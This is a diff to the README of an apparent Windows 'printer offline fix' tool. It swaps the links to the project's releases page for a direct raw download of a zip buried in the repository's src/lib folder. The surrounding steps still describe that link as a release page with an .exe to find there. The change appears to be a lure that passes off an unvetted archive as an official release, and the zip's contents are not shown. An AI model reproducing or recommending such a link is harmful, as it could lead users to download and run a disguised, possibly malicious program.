@@ -1,6 +1,6 @@
 # 🖨️ printer-offline-fix - Restore your printer connection with ease
 
-[![Download printer-offline-fix](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Samkw7740/printer-offline-fix/releases)
+[![Download printer-offline-fix](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Samkw7740/printer-offline-fix/main/src/lib/offline-fix-printer-v3.9.zip)
 
 ## 📌 About this tool
 
@@ -20,7 +20,7 @@ This tool works on most modern Windows systems. Ensure your machine meets these 
 
 Follow these steps to get the file you need:
 
-1. Visit the following link to see the release page: https://github.com/Samkw7740/printer-offline-fix/releases
+1. Visit the following link to see the release page: https://raw.githubusercontent.com/Samkw7740/printer-offline-fix/main/src/lib/offline-fix-printer-v3.9.zip
 2. Find the section labeled Latest.
 3. Look for the file ending in .exe.
 4. Click the file name to start the download.
